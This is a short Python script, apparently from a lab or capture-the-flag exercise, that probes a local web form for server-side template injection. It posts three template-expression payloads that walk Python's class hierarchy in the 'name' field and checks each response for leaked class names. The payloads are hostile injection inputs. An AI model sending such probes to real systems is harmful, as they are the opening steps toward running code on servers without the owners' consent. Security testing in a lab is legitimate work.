import requests
import re

s = requests.Session()
url = "http://127.0.0.1:32856"

s.get(f"{url}/application")

# Test only first 3 payloads (skip subclasses to avoid huge response)
tests = [
    "{{''.__class__}}",
    "{{''.__class__.__mro__}}",
    "{{''.__class__.__mro__[1]}}"
]

for p in tests:
    r = s.post(f"{url}/submit", data={
        "name": p,
        "email": "t@t.com",
        "phone": "123",
        "experience": "5",
        "license": "X"
    })
    
    m = re.search(r'Thank you (.{0,80})', r.text)
    msg = m.group(1) if m else "None"
    
    print(f"{p}")
    print(f"  -> {msg}")
    print(f"  SSTI: {'YES' if '<class' in r.text else 'NO'}")
    print()

